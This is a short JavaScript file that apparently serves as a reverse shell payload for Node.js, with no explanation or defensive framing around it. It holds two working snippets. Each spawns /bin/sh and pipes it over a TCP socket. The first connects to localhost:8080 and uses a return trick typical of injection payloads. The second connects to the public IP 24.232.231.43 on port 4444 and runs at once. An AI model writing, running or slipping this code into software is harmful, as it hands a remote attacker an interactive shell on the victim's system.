(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "localhost", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
});

const test = () => {
    var net = require("net");
    var cp = require("child_process");
    var sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(
        4444,
        "24.232.231.43",
        () => {
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        }
    );
    // return /a/; // Prevents the Node.js application form crashing
}

test();